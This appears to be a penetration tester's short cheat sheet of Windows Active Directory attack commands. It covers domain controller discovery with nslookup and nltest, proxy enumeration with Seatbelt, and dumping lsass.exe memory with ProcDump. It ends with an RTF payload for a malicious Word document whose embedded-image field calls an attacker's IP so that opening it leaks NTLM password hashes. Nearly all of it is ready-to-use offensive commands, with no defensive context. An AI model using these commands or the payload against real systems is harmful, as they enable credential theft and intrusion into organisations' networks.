- Host Discovery/Enum
	- Find Domain Controller
		- `nslookup -q=srv _ldap._tcp.dc._msdcs.contoso.local`
		- `nltest /dclist:contoso.local`
			- Requires domain user privs

- Seatbelt
	- Enumerate proxy settings
		- `seatbelt.exe InternetSettings`

- SysInternals
	- ProcDump64.exe
		- `procdump.exe -accepteula -ma lsass.exe lsass.dmp`

- Malicious Word document with UNC path for embedded image, for harvesting hashes
	- `{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://<kail ip>/a.jpg" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}`